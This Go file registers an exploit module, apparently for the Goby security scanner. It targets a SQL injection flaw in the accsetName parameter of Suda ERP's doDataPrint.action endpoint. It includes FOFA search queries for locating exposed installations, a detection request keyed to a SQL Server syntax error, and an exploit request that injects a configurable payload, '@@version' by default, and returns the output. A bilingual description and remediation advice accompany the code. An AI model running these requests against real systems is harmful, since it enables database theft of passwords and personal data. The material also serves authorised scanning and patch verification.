package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "SudaERP /common/area/areaList!doDataPrint.action file accsetName parameter SQL Injection Vulnerability",
    "Description": "<p>The Suda ERP management system is a comprehensive enterprise resource planning system.</p><p>There is an SQL injection vulnerability in the \"accsetName\" parameter of the \"/common/area/areaList!doDataPrint.action\" file in the Suda ERP management system. Attackers can exploit this vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site. Furthermore, in cases of high privilege, attackers can even inject malware into the server to gain further access to the server system.</p>",
    "Product": "Suda-ERP",
    "Homepage": "http://www.superdata.com.cn/",
    "DisclosureDate": "2024-03-28",
    "PostTime": "2024-03-28",
    "Author": "2783712916@qq.com",
    "FofaQuery": "body=\"jslib/extjs2.3/view/PasswordField.js\" && title!=\"天耀3000\"",
    "GobyQuery": "body=\"jslib/extjs2.3/view/PasswordField.js\" && title!=\"天耀3000\"",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability in the \"accsetName\" parameter of the \"/common/area/areaList!doDataPrint.action\" file in the Suda ERP management system. Attackers can exploit this vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site. Furthermore, in cases of high privilege, attackers can even inject malware into the server to gain further access to the server system.</p>",
    "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqlPayload",
            "type": "input",
            "value": "a';select (convert(int,@@version));-- -ds",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/common/area/areaList!doDataPrint.action",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "accsetName=a'-1'&printId=a&opId=2"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "附近有语法错误",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/common/area/areaList!doDataPrint.action"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/common/area/areaList!doDataPrint.action",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "accsetName={{{sqlPayload}}}&printId=a&opId=2"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Type: application/json",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "速达ERP /area/areaList!doDataPrint.action 文件 accsetName 参数 SQL注入漏洞",
            "Product": "速达-ERP",
            "Description": "<p>速达ERP管理系统是一套完整的企业资源管理系统。<br></p><p>速达ERP管理系统 /common/area/areaList!doDataPrint.action文件accsetName 参数存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1.联系相关厂商，获取安全补丁，及时进行漏洞修复&nbsp;</p><p>2.联系相关安全厂商，及时更新安全阻断策略<br></p>",
            "Impact": "<p>速达ERP管理系统 /common/area/areaList!doDataPrint.action文件accsetName 参数存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "SudaERP /common/area/areaList!doDataPrint.action file accsetName parameter SQL Injection Vulnerability",
            "Product": "Suda-ERP",
            "Description": "<p>The Suda ERP management system is a comprehensive enterprise resource planning system.</p><p>There is an SQL injection vulnerability in the \"accsetName\" parameter of the \"/common/area/areaList!doDataPrint.action\" file in the Suda ERP management system. Attackers can exploit this vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site. Furthermore, in cases of high privilege, attackers can even inject malware into the server to gain further access to the server system.</p>",
            "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
            "Impact": "<p>There is an SQL injection vulnerability in the \"accsetName\" parameter of the \"/common/area/areaList!doDataPrint.action\" file in the Suda ERP management system. Attackers can exploit this vulnerability to retrieve information from the database, such as administrator backend passwords and user personal information on the site. Furthermore, in cases of high privilege, attackers can even inject malware into the server to gain further access to the server system.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
